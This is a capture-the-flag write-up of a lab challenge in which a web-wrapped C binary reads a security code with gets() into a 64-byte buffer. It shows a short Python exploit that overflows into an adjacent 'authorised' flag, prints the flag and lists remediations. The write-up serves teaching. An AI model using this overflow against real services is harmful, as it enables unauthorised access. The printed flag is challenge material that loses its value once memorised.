# Overflow Cascade

## Overview

A network service at `192.168.45.128:8083` presents a "TAPROBANE CORE ACCESS
TERMINAL" that prompts for a security code. It is a Flask/Werkzeug wrapper
around a C binary: `GET /` renders a form, and `POST /run` pipes the submitted
`code` parameter into the binary and returns its stdout. The challenge hint
states the stack frame is "a 64b buffer + control vars" and that "a single value
decides whether you're authenticated" — sitting "closer to your input than the
developer realised." Nothing to download; the whole interaction is over HTTP.

---

## Recon

The first response to a blank or short code is:

```
NEXUS CORE ACCESS TERMINAL
ENTER SECURITY CODE: ACCESS DENIED
```

so the binary simply echoes a prompt, reads a line of input, and prints a
verdict. Sending the raw string (`nc`-style) fails with an HTTP `400 Bad
request syntax`, confirming the service is HTTP, not a raw socket. Two
behaviours become immediately visible while probing lengths:

- Sending **62–63** characters prints a `[NEAR MISS] Partial overflow detected`
  message alongside a `FAKE FLAG` and triggers an 8-second cooldown.
- Rapid requests return HTTP `429 TOO MANY REQUESTS` (rate limiting).

Both are anti-brute-force / honeypot mechanics, not part of the real bug.

---

## Analysis

The binary uses `gets()` to read the code into a **64-byte stack buffer** with
no length limit, and an `authorised` integer (initialised to `0`) lives
immediately after it on the stack. The access check is a simple
`if (authorised)` gate. Overflowing the buffer writes bytes into `authorised`:

| Payload length | What happens on the stack                          | Result                              |
|----------------|----------------------------------------------------|-------------------------------------|
| 62–63          | honeypot branch (`strlen` near-miss check)         | FAKE flag + cooldown                |
| 64             | `gets()` writes the `\0` terminator 1 byte past the buffer → `authorised[0] = 0x00` | `ACCESS DENIED`                     |
| **65+**        | a non-zero byte (`'A'` = `0x41`) lands in `authorised` → value becomes non-zero | `ACCESS GRANTED` / flag page        |

The 64-character case is the subtle bit: `gets()` null-terminates the string, so
sending *exactly* 64 printable chars still overflows — but only with a `0x00`,
which leaves `authorised` false. One extra character is required to flip it.

---

## Exploitation

```python
import re
import urllib.parse
import urllib.request

HOST = "http://192.168.45.128:8083/run"

def run(code: str) -> str:
    data = urllib.parse.urlencode({"code": code}).encode()
    req = urllib.request.Request(HOST, data=data, method="POST")
    return urllib.request.urlopen(req, timeout=10).read().decode(errors="replace")

# 64-byte gets() buffer + adjacent 'authorised' int.
# 65 'A's overflow a non-zero byte (0x41) into 'authorised', passing the check.
resp = run("A" * 65)

flag = re.search(r"MAHASONA\{[^}]+\}", resp)
print(flag.group(0) if flag else resp)
```

The response is the "FILE W-03 RECOVERED" page containing the real flag. The
exploit is intentionally robust: it ignores the honeypot's FAKE flag (which is
never the answer) and lands squarely past the null-terminator edge case.

---

## The Flag

```
MAHASONA{buffer_overflow_core_breach}
```

---

## Remediation

- **Never use `gets()`.** Replace it with `fgets(buf, sizeof(buf), stdin)`,
  which bounds the read to the buffer size.
- **Validate and clamp input length** before copying, regardless of the read
  primitive.
- **Compile with stack protections**: `-fstack-protector-all` (stack canaries)
  and `-D_FORTIFY_SOURCE=2` to turn many unbounded copy operations into aborts.
- **Enable ASLR/PIE** so even a working overflow cannot rely on predictable
  addresses, and mark the stack non-executable (`-z noexecstack`).
- **Don't trust layout order for security**: the flag being "next to" the buffer
  is a coincidence of the compiler's stack layout, not a boundary. Prefer
  explicit, validated comparisons and memory-safe languages (Rust/Go) where
  feasible.
